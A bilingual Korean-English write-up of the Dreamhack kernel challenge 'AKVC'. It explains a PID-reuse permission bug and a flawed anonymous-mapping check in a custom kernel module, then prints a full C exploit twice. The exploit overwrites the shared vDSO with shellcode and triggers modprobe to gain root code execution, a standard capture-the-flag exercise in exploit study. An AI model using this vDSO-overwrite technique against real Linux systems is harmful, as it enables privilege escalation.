---
title: AKVC
title_ko: AKVC
lang: en
draft: false
date: 2026-02-18
tags:
  - linux-kernel
description: "{{description}}"
description_ko: "{{description_ko}}"
---
[lang:ko]
[여기](https://dreamhack.io/wargame/challenges/2512)에서 이 문제를 풀어보실 수 있습니다.

# 핵심 아이디어

1. pid는 재사용될 수 있다.
   ref) https://lwn.net/Articles/794707/
2. 모든 프로세스에서 사용되는 vdso는 동일한 물리적 주소를 사용한다(Copy-on-Write 발생시 제외).

# 취약점

1. pid 재사용 검증 부재로 인해 ro memory의 권한을 RW로 바꿀 수 있다.
   => process A (pid: 1337) 에서 ro memory를 akvc_mmap 하고 exit 한다
   => pid 1337은 다른 process에서 재사용 가능해진다.
   => process B (pid: 1337) 에서 akvc_mprotect를 이용해 ro memory의 권한을 rw로 바꾼다.
   => AKVC VM을 이용해 read-only memory에 원하는 내용 쓰기 가능

   ```c
   static struct akvc_memdesc *akvc_memdesc_init(vm_address_t vm_start, u64 __user host_addr, size_t len, unsigned int prot, struct page **pages)
   {
       struct akvc_memdesc *memdesc;

       memdesc = kzalloc(sizeof(*memdesc), GFP_KERNEL_ACCOUNT);
       if (!memdesc)
           return ERR_PTR(-ENOMEM);

       kref_init(&memdesc->refcount);
       memdesc->host_pid = pid_nr(current->thread_pid);
       memdesc->vm_start = vm_start;
       memdesc->host_addr = host_addr;
       memdesc->len = len;
       memdesc->prot = prot;
       memdesc->pages = pages;

       return memdesc;
   }

   int akvc_mm_mprotect(struct akvc_mm *mm, vm_address_t vm_addr, size_t len, unsigned int prot)
   {
       /* ... */

       if (memdesc->host_pid != pid_nr(current->thread_pid)) {
           ret = -EACCES;
           goto error;
       }

       /* ... */
   }

   int akvc_mm_munmap(struct akvc_mm *mm, vm_address_t vm_addr, size_t len)
   {
       /* ... */

       if (memdesc->host_pid != pid_nr(current->thread_pid)) {
           ret = -EACCES;
           goto error;
       }

       /* ... */
   }
   ```

2. `vma->vm_file` 로 anonymous mapping인지 확인하지만, linux에서는 `vma->vm_ops` 를 이용해서 확인해야 한다.

   ```c
   static bool validate_vma(struct vm_area_struct *vma, u64 __user host_addr, size_t len)
   {
       if (!vma)
           return false;

       /* TODO: support partial mapping */
       if (!(vma->vm_start == host_addr && vma->vm_end == host_addr + len))
           return false;

       /* only anonymous mappings are allowed */
       if (vma->vm_file)
           return false;

       return true;
   }

   static inline bool vma_is_anonymous(struct vm_area_struct *vma)
   {
   	return !vma->vm_ops;
   }
   ```

# Exploit 전략

1. Process A (pid: 1337) 에서 vdso 영역(VA: 0x7f1237fc0000)을 ro로 akvc_mmap 한 뒤, exit 한다.
2. Process B (pid: 1337) 에서 Process A의 vdso 주소에 rw로 mmap 한다. (ASLR이 켜져 있어 Process B의 vdso VA는 Process A의 vdso VA와 높은 확률로 다르다 + 높은 확률로 Process A의 vdso VA는 Process B에서 사용 중이지 않다 => 따라서 높은 확률로 Process A의 vdso 주소에 anonymous memory를 rw로 매핑해도 아무런 문제가 되지 않는다)
3. Process B (pid: 1337) 에서 akvc_mprotect를 이용해 akvc VM에 ro 로 map 된 vdso memory의 권한을 rw로 바꾼다.
4. Process B (pid: 1337) 에서 AKVC VM을 이용해 rw으로 map 된 vdso memory를 마음대로 바꾼다.
5. UMH(e.g. modprobe) 실행을 트리거해서 root 권한의 process에서 우리가 마음대로 바꾼 vdso 를 사용하도록한다 => root 권한에서 임의 코드 실행 가능

# 전체 Exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include "akvc_api.h"
#include "akvc_inst.h"

#define PID_MAX 32768
#define AKVC_MM_MIN_ADDRESS 0UL
#define AKVC_MM_MAX_ADDRESS 0x800000000000UL
#define AKVC_MM_MAP_PROT_READ  (1 << 0)
#define AKVC_MM_MAP_PROT_WRITE (1 << 1)

enum akvc_register {
    R0 = 0,
    R1 = 1,
    R2 = 2,
    R3 = 3,
    GENERAL_REGISTER_MAX = R3,
    PC = 4,
#define AKVC_FLAGS_ZF (1 << 0)
#define AKVC_FLAGS_CF (1 << 1)
    FLAGS = 5,
    REGISTER_MAX = FLAGS,
};

void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void hexdump(const void *data, size_t len)
{
    const unsigned char *p = (const unsigned char *)data;
    unsigned long long max_addr = (unsigned long long)len;
    int addr_width = (max_addr <= 0xFFFFFFFFull) ? 8 : 16;

    for (size_t i = 0; i < len; i += 16) {
        size_t chunk = len - i;
        if (chunk > 16)
            chunk = 16;

        printf("%0*llx  ", addr_width, i);

        for (size_t j = 0; j < 16; ++j) {
            if (j == 8)
                putchar(' ');
            if (j < chunk)
                printf("%02x ", p[i + j]);
            else
                fputs("   ", stdout);
        }

        fputs(" |", stdout);
        for (size_t j = 0; j < chunk; ++j) {
            unsigned char c = p[i + j];
            putchar(isprint(c) ? c : '.');
        }
        fputs("|\n", stdout);
    }
}

int akvc_mmap(int fd, u64 host_addr, u64 vm_addr, size_t len, unsigned int prot)
{
    struct akvc_vm_mmap params = {
        .host_addr = host_addr,
        .vm_addr = vm_addr,
        .len = len,
        .prot = prot
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_MMAP, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_MMAP");

    return 0;
}

int akvc_munmap(int fd, u64 vm_addr, size_t len)
{
    struct akvc_vm_munmap params = {
        .vm_addr = vm_addr,
        .len = len
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_MUNMAP, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_MUNMAP");

    return 0;
}

int akvc_mprotect(int fd, u64 vm_addr, size_t len, unsigned int prot)
{
    struct akvc_vm_mprotect params = {
        .vm_addr = vm_addr,
        .len = len,
        .prot = prot
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_MPROTECT, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_MPROTECT");

    return 0;
}

int akvc_run(int fd, u64 entry_pc, u32 max_steps)
{
    struct akvc_vm_run params = {
        .entry_pc = entry_pc,
        .max_steps = max_steps
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_RUN, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_RUN");

    return 0;
}

u64 get_vdso_address(void)
{
    FILE *fp;
    char buffer[256];
    u64 vdso_addr = 0;

    fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        perror("fopen");
        return 1;
    }

    while (fgets(buffer, sizeof(buffer), fp)) {
        if (strstr(buffer, "[vdso]")) {
            char *dash = strchr(buffer, '-');
            if (dash != NULL) {
                *dash = '\0';
                vdso_addr = strtoull(buffer, NULL, 16);
                break;
            }
        }
    }

    fclose(fp);
    return vdso_addr;
}

void trigger_modprobe(void)
{
    int sk;

    sk = socket(AF_INET, SOCK_STREAM, 0);
    if (sk < 0)
        fatal("socket");

    ioctl(sk, SIOCGIFBR, NULL);

    close(sk);
}

void print_flag(void)
{
    char flag[256];
    FILE *fp = fopen("/flag", "r");
    if (fp == NULL)
        fatal("fopen");

    if (fgets(flag, sizeof(flag), fp) == NULL) {
        fclose(fp);
        fatal("fgets");
    }

    fclose(fp);
    printf("[+] flag: %s\n", flag);
}

void exploit(int akvc_fd, u64 vuln_vm_addr, u64 old_vdso_addr)
{
    int ret;
    u64 new_vdso_addr = get_vdso_address();

    printf("[+] new_vdso_addr: %#lx\n", new_vdso_addr);

    void *dummy = mmap((void *)old_vdso_addr, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (dummy == MAP_FAILED)
        fatal("mmap");

    ret = akvc_mprotect(akvc_fd, vuln_vm_addr, 0x2000, AKVC_MM_MAP_PROT_READ | AKVC_MM_MAP_PROT_WRITE);
    if (ret < 0)
        fatal("akvc_mprotect");

    const int vm_code_size = 0x100000;
    void *vm_code = mmap(NULL, vm_code_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (vm_code == MAP_FAILED)
        fatal("mmap");

    struct akvc_inst *cur = vm_code;

#define WRITE_TO_VM(current, address, value) do {               \
    ((struct akvc_inst *)(current))->op = AKVC_INST_MOV_IMM;                            \
    ((struct akvc_inst *)(current))->mov_imm.dst = R0;                                  \
    ((struct akvc_inst *)(current))->mov_imm.imm = value;                               \
    (current) = (struct akvc_inst *)((char *)(current) + sizeof(u8) + sizeof(struct akvc_inst_mov_imm));  \
    ((struct akvc_inst *)(current))->op = AKVC_INST_STORE;                              \
    ((struct akvc_inst *)(current))->store.reg = R0;                                    \
    ((struct akvc_inst *)(current))->store.addr = address;                              \
    (current) = (struct akvc_inst *)((char *)(current) + sizeof(u8) + sizeof(struct akvc_inst_store));  \
} while (0);

    /*
     * movabs rax,0x6264732f7665642f
     * push 0x0
     * push rax
     * mov rdi, rsp
     * mov rsi, 0666
     * mov rax, 0x5a
     * syscall # chmod("/dev/sdb", 0666)
     *
     * pop rax
     * pop rax
     * xor eax,eax
     * ret
     */
    const char shellcode[] = "\x48\xB8\x2F\x64\x65\x76\x2F\x73\x64\x62\x6A\x00\x50\x48\x89\xE7\x48\xC7\xC6\xB6\x01\x00\x00\x48\xC7\xC0\x5A\x00\x00\x00\x0F\x05\x58\x58\x31\xC0\xC3";

    /*
     * mov rax, 0x67616c662f
     * push rax
     * mov rdi, rsp
     * mov rsi, 0
     * mov rax, 2
     * syscall # open("/flag", 0)
     *
     * mov rdi, rax
     * mov rsi, rsp
     * mov rdx, 0x100
     * mov rax, 0
     * syscall # read(fd, buf, 0x100)
     *
     * push 0x3053
     * mov rax, 0x7974742f7665642f
     * push rax
     * mov rdi, rsp
     * mov rsi, 2
     * mov rax, 2
     * syscall # open("/dev/tty", 2)
     *
     * mov rdi, rax
     * mov rsi, rsp
     * sub rsi, 0x10
     * mov rdx, 0x100
     * mov rax, 1
     * syscall # write(fd, buf, 0x100)
     *
     * mov rdi, 0
     * mov rax, 60
     * syscall # exit(0)
     */
    // const char shellcode[] = "\x48\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x50\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x68\x53\x30\x00\x00\x48\xB8\x2F\x64\x65\x76\x2F\x74\x74\x79\x50\x48\x89\xE7\x48\xC7\xC6\x02\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x10\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05";
    const int getrandom_offset = 0xa30;

    for (size_t i = 0; i < sizeof(shellcode) + 8; i += 8) {
        u64 chunk = 0;
        WRITE_TO_VM(cur, vuln_vm_addr + getrandom_offset + i, *(u64 *)(shellcode + i));
    }

    u64 vm_code_addr = AKVC_MM_MAX_ADDRESS - vm_code_size;
    ret = akvc_mmap(akvc_fd, (u64)vm_code, vm_code_addr, vm_code_size, AKVC_MM_MAP_PROT_READ | AKVC_MM_MAP_PROT_WRITE);
    if (ret < 0)
        fatal("akvc_mmap");

    ret = akvc_run(akvc_fd, vm_code_addr, 0x10000);
    if (ret < 0)
        fatal("akvc_run");

    trigger_modprobe();

    print_flag();
}

int main(int argc, char *argv[])
{
    int fd;
    u64 *pid_to_vm_addr;
    u64 vdso_addr, current_vm_addr, vuln_vm_addr;
    int ret;

    if (argc == 4) {
        int akvc_fd = atoi(argv[1]);
        u64 vuln_vm_addr = atol(argv[2]);
        u64 old_vdso_addr = atol(argv[3]);

        printf("[+] akvc_fd: %d\n", akvc_fd);
        printf("[+] vuln_vm_addr: %#lx\n", vuln_vm_addr);
        printf("[+] old_vdso_addr: %#lx\n", old_vdso_addr);
        exploit(akvc_fd, vuln_vm_addr, old_vdso_addr);
        return 0;
    } else {
        fd = open("/dev/akvc", O_RDWR);
        if (fd < 0)
            fatal("open");

        vdso_addr = get_vdso_address();
        printf("[+] vdso address: %#lx\n", vdso_addr);

        pid_to_vm_addr = mmap(NULL, PID_MAX * sizeof(u64), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (pid_to_vm_addr == MAP_FAILED)
            fatal("mmap");

        current_vm_addr = 0x1000;
        while (1) {
            int ret = fork();
            if (ret < 0) {
                perror("??\n");
                exit(1);
            }

            if (ret == 0) {
                int pid = getpid();

                if (!pid_to_vm_addr[pid]) {
                    pid_to_vm_addr[pid] = current_vm_addr;
                    ret = akvc_mmap(fd, vdso_addr, current_vm_addr, 0x2000, AKVC_MM_MAP_PROT_READ);
                    if (ret < 0)
                        fatal("akvc_mmap");
                    current_vm_addr += 0x2000;
                    continue;
                } else {
                    printf("[+] pid is reused!!\n");
                    break;
                }
            } else {
                exit(0);
            }
        }

        vuln_vm_addr = pid_to_vm_addr[getpid()];
        printf("[+] vuln_vm_addr: %#lx\n", vuln_vm_addr);

        char fd_str[16], vuln_vm_addr_str[32], vdso_addr_str[32];
        snprintf(fd_str, sizeof(fd_str), "%d", fd);
        snprintf(vuln_vm_addr_str, sizeof(vuln_vm_addr_str), "%lu", vuln_vm_addr);
        snprintf(vdso_addr_str, sizeof(vdso_addr_str), "%lu", vdso_addr);
        ret = execl("/exploit", "/exploit", fd_str, vuln_vm_addr_str, vdso_addr_str, NULL);
        if (ret < 0)
            fatal("execl");
    }

    return 0;
}
```

[lang:en]

> [!warning] This post was translated by an LLM. If you would like to read the original, please click the `한국어` button in the top-left corner.

You can try solving this challenge [here](https://dreamhack.io/wargame/challenges/2512).

# Key Ideas

1. A PID can be reused.
   ref) https://lwn.net/Articles/794707/
2. The vDSO used by all processes shares the same physical pages (except when Copy-on-Write occurs).

# Vulnerabilities

1. Because there is no validation against PID reuse, the permission of read-only memory can be changed to read-write.
   => Process A (pid: 1337) maps read-only memory with `akvc_mmap` and exits.
   => PID 1337 becomes reusable by another process.
   => Process B (pid: 1337) uses `akvc_mprotect` to change the permission of that read-only memory to read-write.
   => Then arbitrary data can be written into read-only memory through the AKVC VM.

   ```c
   static struct akvc_memdesc *akvc_memdesc_init(vm_address_t vm_start, u64 __user host_addr, size_t len, unsigned int prot, struct page **pages)
   {
       struct akvc_memdesc *memdesc;

       memdesc = kzalloc(sizeof(*memdesc), GFP_KERNEL_ACCOUNT);
       if (!memdesc)
           return ERR_PTR(-ENOMEM);

       kref_init(&memdesc->refcount);
       memdesc->host_pid = pid_nr(current->thread_pid);
       memdesc->vm_start = vm_start;
       memdesc->host_addr = host_addr;
       memdesc->len = len;
       memdesc->prot = prot;
       memdesc->pages = pages;

       return memdesc;
   }

   int akvc_mm_mprotect(struct akvc_mm *mm, vm_address_t vm_addr, size_t len, unsigned int prot)
   {
       /* ... */

       if (memdesc->host_pid != pid_nr(current->thread_pid)) {
           ret = -EACCES;
           goto error;
       }

       /* ... */
   }

   int akvc_mm_munmap(struct akvc_mm *mm, vm_address_t vm_addr, size_t len)
   {
       /* ... */

       if (memdesc->host_pid != pid_nr(current->thread_pid)) {
           ret = -EACCES;
           goto error;
       }

       /* ... */
   }
   ```

2. It checks whether the mapping is anonymous by testing `vma->vm_file`, but on Linux this should be validated via `vma->vm_ops`.

   ```c
   static bool validate_vma(struct vm_area_struct *vma, u64 __user host_addr, size_t len)
   {
       if (!vma)
           return false;

       /* TODO: support partial mapping */
       if (!(vma->vm_start == host_addr && vma->vm_end == host_addr + len))
           return false;

       /* only anonymous mappings are allowed */
       if (vma->vm_file)
           return false;

       return true;
   }

   static inline bool vma_is_anonymous(struct vm_area_struct *vma)
   {
       return !vma->vm_ops;
   }
   ```

# Exploit Strategy

1. In Process A (pid: 1337), map the vDSO region (VA: `0x7f1237fc0000`) as read-only with `akvc_mmap`, then exit.
2. In Process B (pid: 1337), map anonymous read-write memory at Process A's old vDSO address.
   (With ASLR enabled, Process B's own vDSO VA is highly likely to differ from Process A's, and Process A's vDSO VA is also highly likely to be unused in Process B. So mapping anonymous RW memory at Process A's old vDSO VA is likely to succeed without conflict.)
3. In Process B (pid: 1337), use `akvc_mprotect` to change the permission of the vDSO memory mapped as read-only in the AKVC VM to read-write.
4. In Process B (pid: 1337), use the AKVC VM to arbitrarily overwrite that now read-write mapped vDSO memory.
5. Trigger UMH execution (e.g. `modprobe`) so a root-privileged process uses the modified vDSO.
   => This leads to arbitrary code execution with root privileges.

# Full Exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include "akvc_api.h"
#include "akvc_inst.h"

#define PID_MAX 32768
#define AKVC_MM_MIN_ADDRESS 0UL
#define AKVC_MM_MAX_ADDRESS 0x800000000000UL
#define AKVC_MM_MAP_PROT_READ  (1 << 0)
#define AKVC_MM_MAP_PROT_WRITE (1 << 1)

enum akvc_register {
    R0 = 0,
    R1 = 1,
    R2 = 2,
    R3 = 3,
    GENERAL_REGISTER_MAX = R3,
    PC = 4,
#define AKVC_FLAGS_ZF (1 << 0)
#define AKVC_FLAGS_CF (1 << 1)
    FLAGS = 5,
    REGISTER_MAX = FLAGS,
};

void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void hexdump(const void *data, size_t len)
{
    const unsigned char *p = (const unsigned char *)data;
    unsigned long long max_addr = (unsigned long long)len;
    int addr_width = (max_addr <= 0xFFFFFFFFull) ? 8 : 16;

    for (size_t i = 0; i < len; i += 16) {
        size_t chunk = len - i;
        if (chunk > 16)
            chunk = 16;

        printf("%0*llx  ", addr_width, i);

        for (size_t j = 0; j < 16; ++j) {
            if (j == 8)
                putchar(' ');
            if (j < chunk)
                printf("%02x ", p[i + j]);
            else
                fputs("   ", stdout);
        }

        fputs(" |", stdout);
        for (size_t j = 0; j < chunk; ++j) {
            unsigned char c = p[i + j];
            putchar(isprint(c) ? c : '.');
        }
        fputs("|\n", stdout);
    }
}

int akvc_mmap(int fd, u64 host_addr, u64 vm_addr, size_t len, unsigned int prot)
{
    struct akvc_vm_mmap params = {
        .host_addr = host_addr,
        .vm_addr = vm_addr,
        .len = len,
        .prot = prot
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_MMAP, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_MMAP");

    return 0;
}

int akvc_munmap(int fd, u64 vm_addr, size_t len)
{
    struct akvc_vm_munmap params = {
        .vm_addr = vm_addr,
        .len = len
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_MUNMAP, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_MUNMAP");

    return 0;
}

int akvc_mprotect(int fd, u64 vm_addr, size_t len, unsigned int prot)
{
    struct akvc_vm_mprotect params = {
        .vm_addr = vm_addr,
        .len = len,
        .prot = prot
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_MPROTECT, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_MPROTECT");

    return 0;
}

int akvc_run(int fd, u64 entry_pc, u32 max_steps)
{
    struct akvc_vm_run params = {
        .entry_pc = entry_pc,
        .max_steps = max_steps
    };
    int ret;

    ret = ioctl(fd, AKVC_IOCTL_VM_RUN, &params);
    if (ret < 0)
        fatal("AKVC_IOCTL_VM_RUN");

    return 0;
}

u64 get_vdso_address(void)
{
    FILE *fp;
    char buffer[256];
    u64 vdso_addr = 0;

    fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        perror("fopen");
        return 1;
    }

    while (fgets(buffer, sizeof(buffer), fp)) {
        if (strstr(buffer, "[vdso]")) {
            char *dash = strchr(buffer, '-');
            if (dash != NULL) {
                *dash = '\0';
                vdso_addr = strtoull(buffer, NULL, 16);
                break;
            }
        }
    }

    fclose(fp);
    return vdso_addr;
}

void trigger_modprobe(void)
{
    int sk;

    sk = socket(AF_INET, SOCK_STREAM, 0);
    if (sk < 0)
        fatal("socket");

    ioctl(sk, SIOCGIFBR, NULL);

    close(sk);
}

void print_flag(void)
{
    char flag[256];
    FILE *fp = fopen("/flag", "r");
    if (fp == NULL)
        fatal("fopen");

    if (fgets(flag, sizeof(flag), fp) == NULL) {
        fclose(fp);
        fatal("fgets");
    }

    fclose(fp);
    printf("[+] flag: %s\n", flag);
}

void exploit(int akvc_fd, u64 vuln_vm_addr, u64 old_vdso_addr)
{
    int ret;
    u64 new_vdso_addr = get_vdso_address();

    printf("[+] new_vdso_addr: %#lx\n", new_vdso_addr);

    void *dummy = mmap((void *)old_vdso_addr, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (dummy == MAP_FAILED)
        fatal("mmap");

    ret = akvc_mprotect(akvc_fd, vuln_vm_addr, 0x2000, AKVC_MM_MAP_PROT_READ | AKVC_MM_MAP_PROT_WRITE);
    if (ret < 0)
        fatal("akvc_mprotect");

    const int vm_code_size = 0x100000;
    void *vm_code = mmap(NULL, vm_code_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (vm_code == MAP_FAILED)
        fatal("mmap");

    struct akvc_inst *cur = vm_code;

#define WRITE_TO_VM(current, address, value) do {               \
    ((struct akvc_inst *)(current))->op = AKVC_INST_MOV_IMM;                            \
    ((struct akvc_inst *)(current))->mov_imm.dst = R0;                                  \
    ((struct akvc_inst *)(current))->mov_imm.imm = value;                               \
    (current) = (struct akvc_inst *)((char *)(current) + sizeof(u8) + sizeof(struct akvc_inst_mov_imm));  \
    ((struct akvc_inst *)(current))->op = AKVC_INST_STORE;                              \
    ((struct akvc_inst *)(current))->store.reg = R0;                                    \
    ((struct akvc_inst *)(current))->store.addr = address;                              \
    (current) = (struct akvc_inst *)((char *)(current) + sizeof(u8) + sizeof(struct akvc_inst_store));  \
} while (0);

    /*
     * movabs rax,0x6264732f7665642f
     * push 0x0
     * push rax
     * mov rdi, rsp
     * mov rsi, 0666
     * mov rax, 0x5a
     * syscall # chmod("/dev/sdb", 0666)
     *
     * pop rax
     * pop rax
     * xor eax,eax
     * ret
     */
    const char shellcode[] = "\x48\xB8\x2F\x64\x65\x76\x2F\x73\x64\x62\x6A\x00\x50\x48\x89\xE7\x48\xC7\xC6\xB6\x01\x00\x00\x48\xC7\xC0\x5A\x00\x00\x00\x0F\x05\x58\x58\x31\xC0\xC3";

    /*
     * mov rax, 0x67616c662f
     * push rax
     * mov rdi, rsp
     * mov rsi, 0
     * mov rax, 2
     * syscall # open("/flag", 0)
     *
     * mov rdi, rax
     * mov rsi, rsp
     * mov rdx, 0x100
     * mov rax, 0
     * syscall # read(fd, buf, 0x100)
     *
     * push 0x3053
     * mov rax, 0x7974742f7665642f
     * push rax
     * mov rdi, rsp
     * mov rsi, 2
     * mov rax, 2
     * syscall # open("/dev/tty", 2)
     *
     * mov rdi, rax
     * mov rsi, rsp
     * sub rsi, 0x10
     * mov rdx, 0x100
     * mov rax, 1
     * syscall # write(fd, buf, 0x100)
     *
     * mov rdi, 0
     * mov rax, 60
     * syscall # exit(0)
     */
    // const char shellcode[] = "\x48\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x50\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x68\x53\x30\x00\x00\x48\xB8\x2F\x64\x65\x76\x2F\x74\x74\x79\x50\x48\x89\xE7\x48\xC7\xC6\x02\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x10\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05";
    const int getrandom_offset = 0xa30;

    for (size_t i = 0; i < sizeof(shellcode) + 8; i += 8) {
        u64 chunk = 0;
        WRITE_TO_VM(cur, vuln_vm_addr + getrandom_offset + i, *(u64 *)(shellcode + i));
    }

    u64 vm_code_addr = AKVC_MM_MAX_ADDRESS - vm_code_size;
    ret = akvc_mmap(akvc_fd, (u64)vm_code, vm_code_addr, vm_code_size, AKVC_MM_MAP_PROT_READ | AKVC_MM_MAP_PROT_WRITE);
    if (ret < 0)
        fatal("akvc_mmap");

    ret = akvc_run(akvc_fd, vm_code_addr, 0x10000);
    if (ret < 0)
        fatal("akvc_run");

    trigger_modprobe();

    print_flag();
}

int main(int argc, char *argv[])
{
    int fd;
    u64 *pid_to_vm_addr;
    u64 vdso_addr, current_vm_addr, vuln_vm_addr;
    int ret;

    if (argc == 4) {
        int akvc_fd = atoi(argv[1]);
        u64 vuln_vm_addr = atol(argv[2]);
        u64 old_vdso_addr = atol(argv[3]);

        printf("[+] akvc_fd: %d\n", akvc_fd);
        printf("[+] vuln_vm_addr: %#lx\n", vuln_vm_addr);
        printf("[+] old_vdso_addr: %#lx\n", old_vdso_addr);
        exploit(akvc_fd, vuln_vm_addr, old_vdso_addr);
        return 0;
    } else {
        fd = open("/dev/akvc", O_RDWR);
        if (fd < 0)
            fatal("open");

        vdso_addr = get_vdso_address();
        printf("[+] vdso address: %#lx\n", vdso_addr);

        pid_to_vm_addr = mmap(NULL, PID_MAX * sizeof(u64), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (pid_to_vm_addr == MAP_FAILED)
            fatal("mmap");

        current_vm_addr = 0x1000;
        while (1) {
            int ret = fork();
            if (ret < 0) {
                perror("??\n");
                exit(1);
            }

            if (ret == 0) {
                int pid = getpid();

                if (!pid_to_vm_addr[pid]) {
                    pid_to_vm_addr[pid] = current_vm_addr;
                    ret = akvc_mmap(fd, vdso_addr, current_vm_addr, 0x2000, AKVC_MM_MAP_PROT_READ);
                    if (ret < 0)
                        fatal("akvc_mmap");
                    current_vm_addr += 0x2000;
                    continue;
                } else {
                    printf("[+] pid is reused!!\n");
                    break;
                }
            } else {
                exit(0);
            }
        }

        vuln_vm_addr = pid_to_vm_addr[getpid()];
        printf("[+] vuln_vm_addr: %#lx\n", vuln_vm_addr);

        char fd_str[16], vuln_vm_addr_str[32], vdso_addr_str[32];
        snprintf(fd_str, sizeof(fd_str), "%d", fd);
        snprintf(vuln_vm_addr_str, sizeof(vuln_vm_addr_str), "%lu", vuln_vm_addr);
        snprintf(vdso_addr_str, sizeof(vdso_addr_str), "%lu", vdso_addr);
        ret = execl("/exploit", "/exploit", fd_str, vuln_vm_addr_str, vdso_addr_str, NULL);
        if (ret < 0)
            fatal("execl");
    }

    return 0;
}
```
